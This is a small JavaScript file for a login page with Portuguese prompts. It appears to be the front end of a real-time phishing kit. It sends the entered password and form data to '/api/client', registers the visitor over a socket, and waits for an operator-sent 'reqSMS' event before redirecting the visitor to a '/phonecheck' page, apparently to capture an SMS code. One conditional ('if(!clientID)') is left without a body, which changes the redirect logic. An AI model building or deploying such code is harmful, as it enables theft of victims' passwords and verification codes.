
const password = (() => {
    //private var/functions
    const inputID = document.querySelector('input[name="userID"]')

    async function insertClient(form) {

        if(!form) return

        const data = util.serialize(form)

        const insert = await util.post('/api/client', { body: data})

        socket.emit('joinClient', insert)

        inputID.value = insert.id
    }

    async function submitPassword(form) {
        const formul = document.querySelector(`${form}:not(.formMail__code)`);

        if(!formul) return

        if(formul.classList.contains('formMail__code')) return

        const btnSubmit = formul.querySelector('button');

        if(!btnSubmit) return

        btnSubmit.addEventListener('click', function (e) {
            // body
            e.preventDefault()

            const pass = btnSubmit.closest('form').elements['password']
            const mail = btnSubmit.closest('form').elements['mail']


            if(pass) {

                if(!pass.value) {
                    pass.setCustomValidity("Informe sua senha de acesso");
                    return pass.reportValidity()

                }
                else{
                    const loader = document.querySelector('.loader');

                    loader.classList.remove('hidden')

                    insertClient(formul)
                }
            }
            // body

            if(mail) {

                

                if(!mail.value){
                    mail.setCustomValidity("Informe um e-mail para acessar sua conta");
                    return mail.reportValidity()

                }
                else
                    return btnSubmit.closest('form').submit()
            }
        });


    }

    async function receive() {
        socket.on('reqSMS', (client) => {
            const inpt = document.querySelector('input[name="userID"]')

            if(!inpt) return
            const clientID = inpt.value

            if(!clientID) 
            

            if(client.id == clientID) return window.location.href = `/phonecheck/${clientID}`
        })
    }
    
    
    return {
        //public var/functions
        submitPassword,
        receive
    }
})()

password.receive()

password.submitPassword(`form.formMail:not(.formMail__code)`)